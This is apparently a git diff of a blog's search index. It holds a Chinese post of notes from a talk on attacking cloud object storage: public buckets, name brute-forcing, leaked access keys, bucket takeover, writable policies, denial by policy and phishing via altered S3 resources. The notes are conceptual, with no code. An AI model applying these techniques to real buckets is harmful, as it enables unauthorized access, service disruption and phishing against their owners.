+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/gh0stkey/HaE</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-7bucket与子域接管"><a href="#2-7bucket与子域接管" class="headerlink" title="2.7bucket与子域接管"></a>2.7bucket与子域接管</h2><p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319213519789.png" alt="image-20220319213519789"></p>
+<p>大概意思就是，管理员删除了存储桶但是没有删除地址解析，然后我们自己创建一个bucket，和那个受害删除桶的名称一样，上传一个文件可以看到上传上去了，这就是成功接管了这个桶了</p>
+<p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319213547151.png" alt="image-20220319213547151"></p>
+<h2 id="2-8bucket策略配置可写"><a href="#2-8bucket策略配置可写" class="headerlink" title="2.8bucket策略配置可写"></a>2.8bucket策略配置可写</h2><p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319215031791.png" alt="image-20220319215031791"></p>
+<h2 id="2-9修改bucket策略为deny使业务瘫痪"><a href="#2-9修改bucket策略为deny使业务瘫痪" class="headerlink" title="2.9修改bucket策略为deny使业务瘫痪"></a>2.9修改bucket策略为deny使业务瘫痪</h2><p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319215152619.png" alt="image-20220319215152619"></p>
+<h2 id="2-10修改网站引用s3资源进行钓鱼"><a href="#2-10修改网站引用s3资源进行钓鱼" class="headerlink" title="2.10修改网站引用s3资源进行钓鱼"></a>2.10修改网站引用s3资源进行钓鱼</h2><p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319215311222.png" alt="image-20220319215311222"></p>
+]]></content>
+      <categories>
+        <category>-penetration</category>
+      </categories>
+  </entry>
+  <entry>
     <title>攻防世界 mfw git泄露</title>
     <url>/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/</url>
     <content><![CDATA[<h1 id="攻防世界-mfw-git泄露"><a href="#攻防世界-mfw-git泄露" class="headerlink" title="攻防世界 mfw git泄露"></a>攻防世界 mfw git泄露</h1><p>由于昨天才学了git，找一道题来练练手</p>
@@ -2965,44 +3003,6 @@
 <p><a href="http://www.z-sms.com/sms-receive-free.php?pho_num=15227789961&amp;1">http://www.z-sms.com/sms-receive-free.php?pho_num=15227789961&amp;1</a></p>
 <p><a href="https://smsreceivefree.com/country/usa">https://smsreceivefree.com/country/usa</a></p>
 <p><a href="https://jiemahao.com/sms/?phone=5">https://jiemahao.com/sms/?phone=5</a></p>
-]]></content>
-      <categories>
-        <category>-penetration</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>火线沙龙云存储浅析 观看笔记</title>
-    <url>/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<h1 id="火线沙龙云存储浅析-观看笔记"><a href="#火线沙龙云存储浅析-观看笔记" class="headerlink" title="火线沙龙云存储浅析 观看笔记"></a>火线沙龙云存储浅析 观看笔记</h1><h1 id="1-何为对象存储"><a href="#1-何为对象存储" class="headerlink" title="1.何为对象存储"></a>1.何为对象存储</h1><p>对线存储(object-based storage)。也可以叫做面向对象的存储，现在也有不少厂商直接把他叫做云存储<img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319194028830.png" alt="image-20220319194028830"></p>
-<h1 id="2-对象存储的利用方式"><a href="#2-对象存储的利用方式" class="headerlink" title="2.对象存储的利用方式"></a>2.对象存储的利用方式</h1><h2 id="2-1bucket公开访问"><a href="#2-1bucket公开访问" class="headerlink" title="2.1bucket公开访问"></a>2.1bucket公开访问</h2><p>在此时如果选择公有读的话，会出现两种情况</p>
-<p>1.在只配置读写权限设置为公有读或公共读写的情况下，无法列出对象，但是可以直接访问对应的key路径。</p>
-<p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319212000584.png" alt="image-20220319212000584"></p>
-<p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319212010434.png" alt="image-20220319212010434"></p>
-<p>也就是俗话说的，访问其下面的路径，类似未授权访问。</p>
-<p>2.如果想列出object对象，只需要在bucket授权策略中设置listobject即可。<img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319212131809.png" alt="image-20220319212131809"></p>
-<p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319212142347.png" alt="image-20220319212142347"></p>
-<h2 id="2-2bucket桶爆破"><a href="#2-2bucket桶爆破" class="headerlink" title="2.2bucket桶爆破"></a>2.2bucket桶爆破</h2><p>当知道bucket名称的时候，可以通过爆破获得bucket名称，这有些类似于目录爆破，只不过目录爆破一般通过状态码判断，而这个通过页面的内容判断</p>
-<p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319212403531.png" alt="image-20220319212403531"></p>
-<p>下面是名称对了，第一个是设置了objectlist，后面是没有权限访问</p>
-<p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319212457984.png" alt="image-20220319212457984"></p>
-<h2 id="2-3特定的bucket策略配置"><a href="#2-3特定的bucket策略配置" class="headerlink" title="2.3特定的bucket策略配置"></a>2.3特定的bucket策略配置</h2><p>特定的策略配置是指，如果管理员设置了某些ip，ua才可以请求改存储桶的话，此时如果错误的配置了getbucketpolicy，可导致攻击者获取策略配置。</p>
-<p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319212724053.png" alt="image-20220319212724053"></p>
-<p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319212753558.png" alt="image-20220319212753558"></p>
-<p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319212821561.png" alt="image-20220319212821561"></p>
-<h2 id="2-4bucket-object遍历"><a href="#2-4bucket-object遍历" class="headerlink" title="2.4bucket object遍历"></a>2.4bucket object遍历</h2><p>类似于目录遍历</p>
-<p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319212903537.png" alt="image-20220319212903537"></p>
-<h2 id="2-5任意文件上传与覆盖"><a href="#2-5任意文件上传与覆盖" class="headerlink" title="2.5任意文件上传与覆盖"></a>2.5任意文件上传与覆盖</h2><p>如果在配置存储桶，管理员错误的将存储桶权限，配置为可写，这将会导致攻击者可上传任意文件去覆盖。</p>
-<h2 id="2-6accesskeyld，secretaccessket泄露"><a href="#2-6accesskeyld，secretaccessket泄露" class="headerlink" title="2.6accesskeyld，secretaccessket泄露"></a>2.6accesskeyld，secretaccessket泄露</h2><p>1.通过github等开源平台中的源代码中可发现存在泄露的key。</p>
-<p>2.通过反编译apk，小程序找到敏感信息。</p>
-<p>3.在目标网站源代码中找到一些敏感的信息，js等。<img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319213139689.png" alt="image-20220319213139689">有个工具推荐，是burp的插件，就是我们把正则表达式配置好，他会自动检测流量，然后看是否复合正则表达式。 </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/gh0stkey/HaE</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-7bucket与子域接管"><a href="#2-7bucket与子域接管" class="headerlink" title="2.7bucket与子域接管"></a>2.7bucket与子域接管</h2><p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319213519789.png" alt="image-20220319213519789"></p>
-<p>大概意思就是，管理员删除了存储桶但是没有删除地址解析，然后我们自己创建一个bucket，和那个受害删除桶的名称一样，上传一个文件可以看到上传上去了，这就是成功接管了这个桶了</p>
-<p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319213547151.png" alt="image-20220319213547151"></p>
-<h2 id="2-8bucket策略配置可写"><a href="#2-8bucket策略配置可写" class="headerlink" title="2.8bucket策略配置可写"></a>2.8bucket策略配置可写</h2><p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319215031791.png" alt="image-20220319215031791"></p>
-<h2 id="2-9修改bucket策略为deny使业务瘫痪"><a href="#2-9修改bucket策略为deny使业务瘫痪" class="headerlink" title="2.9修改bucket策略为deny使业务瘫痪"></a>2.9修改bucket策略为deny使业务瘫痪</h2><p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319215152619.png" alt="image-20220319215152619"></p>
-<h2 id="2-10修改网站引用s3资源进行钓鱼"><a href="#2-10修改网站引用s3资源进行钓鱼" class="headerlink" title="2.10修改网站引用s3资源进行钓鱼"></a>2.10修改网站引用s3资源进行钓鱼</h2><p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319215311222.png" alt="image-20220319215311222"></p>
 ]]></content>
       <categories>
         <category>-penetration</category>
